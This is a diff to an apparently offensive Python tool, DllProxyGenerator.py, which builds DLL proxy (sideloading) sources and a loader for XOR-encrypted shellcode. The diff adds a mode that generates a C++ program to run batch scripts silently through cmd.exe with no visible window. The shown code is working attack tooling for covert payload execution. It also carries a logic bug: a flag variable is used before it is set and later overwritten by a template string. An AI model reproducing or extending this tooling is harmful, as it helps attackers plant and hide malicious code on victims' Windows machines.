@@ -9,6 +9,7 @@ from string import Template
 
 createLoader = False
 createProxy = True
+cppScriptPath = ""
 ErrorSign = "\033[33m[!]\033[0m"
 Success = "\033[32m[+]\033[0m"
 Status = "\033[94m[*]\033[0m"
@@ -41,24 +42,34 @@ Usage: \033[0mDllProxyGenerator.py [<dll_path> <output_exe_path>] [<shellcode_pa
 \033[0m
 """
 
-dllPath = sys.argv[1] if len(sys.argv) > 1 else sys.exit(usage)
-exepath = sys.argv[2] if len(sys.argv) > 2 else sys.exit(usage)
+startingbat = ""
 
-if len(sys.argv) > 5:
-    createLoader = True
-    shellcodepath = sys.argv[3]
-    masterKey = sys.argv[4]
-
-    cppScriptPath = sys.argv[5]
-else:
-    cppScriptPath = sys.argv[3] if len(sys.argv) > 3 else sys.exit(usage)
-    if len(sys.argv) > 4: sys.exit(usage)
-
-loaderName = "ShellCodeLoader - COMPILE TO EXE.cpp"
-finalProxyName = f'{ os.path.basename(cppScriptPath.strip(".dll"))} - COMPILE TO DLL.cpp'
-
-if dllPath == "null" and exepath == "null":
+if sys.argv[1] == "bat_starter":
+    for i in range(2, len(sys.argv)):
+        startingbat += sys.argv[i] + "\n"
+    startingbat = startingbat.strip()
+    batstarter = True
     createProxy = False
+
+if not batstarter:
+    dllPath = sys.argv[1] if len(sys.argv) > 1 else sys.exit(usage)
+    exepath = sys.argv[2] if len(sys.argv) > 2 else sys.exit(usage)
+
+    if len(sys.argv) > 5:
+        createLoader = True
+        shellcodepath = sys.argv[3]
+        masterKey = sys.argv[4]
+
+        cppScriptPath = sys.argv[5]
+    else:
+        cppScriptPath = sys.argv[3] if len(sys.argv) > 3 else sys.exit(usage)
+        if len(sys.argv) > 4: sys.exit(usage)
+
+    loaderName = "ShellCodeLoader - COMPILE TO EXE.cpp"
+    finalProxyName = f'{ os.path.basename(cppScriptPath.strip(".dll"))} - COMPILE TO DLL.cpp'
+
+    if dllPath == "null" and exepath == "null":
+        createProxy = False
 
 
 def xor(data, key):
@@ -80,6 +91,71 @@ def formatCPP(data, key, cipherType):
     shellcode = "unsigned char enc[] =\n"
     shellcode += "\"" + "\"\n\"".join(lines) + "\";"
     return shellcode
+
+batstarter = """
+#include <windows.h>
+#include <string>
+#include <vector>
+
+//compile with: cl /std:c++17 /EHsc batstarter.cpp /link user32.lib /SUBSYSTEM:WINDOWS
+
+bool start_bat(char* file)
+{
+
+    const char* tmpl = file;
+    DWORD needed = ExpandEnvironmentStringsA(tmpl, nullptr, 0);
+    if (needed == 0) {
+        return false;
+    }
+
+    std::vector<char> expanded(needed);
+    if (ExpandEnvironmentStringsA(tmpl, expanded.data(), needed) == 0) {
+        return false;
+    }
+
+    std::string scriptPath = expanded.data();
+    std::string cmdLine = std::string("/C \\"") + scriptPath + "\\"";
+    std::vector<char> cmdMutable(cmdLine.begin(), cmdLine.end());
+    cmdMutable.push_back('\\0');
+
+    STARTUPINFOA si{};
+    PROCESS_INFORMATION pi{};
+    si.cb = sizeof(si);
+
+
+    BOOL ok = CreateProcessA(
+        "C:\\\\Windows\\\\System32\\\\cmd.exe",
+        cmdMutable.data(),
+        nullptr, nullptr,
+        FALSE,
+        CREATE_NO_WINDOW,
+        nullptr,
+        nullptr,
+        &si, &pi);
+
+    if (!ok) {
+        DWORD err = GetLastError();
+        char msg[64];
+        sprintf_s(msg, "CreateProcess failed (%lu)", err);
+        return false;
+    }
+
+
+    WaitForSingleObject(pi.hProcess, INFINITE);
+
+
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    return true;
+}
+
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
+{
+    //STARTING_BAT
+    return 0;
+}
+"""
 
 shellCodeLoader = """
 #include <windows.h>
@@ -371,11 +447,22 @@ if __name__ == '__main__':
         shellCodeLoader = shellCodeLoader.replace("SHELLCODE_PLACEHOLDER", shellcode)
         shellCodeLoader = shellCodeLoader.replace("KEY", f'char key[] = "{masterKey}";')
 
+    if startingbat:
+        for i in range(2, len(sys.argv)):
+            path = startingbat.split("\n")[i - 2].replace("\\", "\\\\")
+            batstarter = batstarter.replace("//STARTING_BAT", f'//STARTING_BAT\nstart_bat("{path}");\n')
+
+        with open("batstarter.cpp", "w", encoding="utf-8") as f:
+            f.write(batstarter)
+        print(f"{Status} C++ Batstarter script written to './batstarter.cpp'\n{Status} Compile with: cl /std:c++17 /EHsc batstarter.cpp /link user32.lib /SUBSYSTEM:WINDOWS")
+
     if createProxy:
         loaderName = f'{ os.path.basename(exepath.strip(".dll"))} - COMPILE TO EXE.cpp'
         with open(os.path.join(os.path.dirname(cppScriptPath), finalProxyName), "w", encoding="utf-8") as f:
             f.write(dllTemplate)
         print(f"{Status} C++ proxy script written to {os.path.abspath(finalProxyName)}")
+    elif cppScriptPath:
+        loaderName = os.path.basename(cppScriptPath)
     
     if createLoader:
         with open(os.path.join(os.path.dirname(cppScriptPath), loaderName), "w", encoding="utf-8") as f:
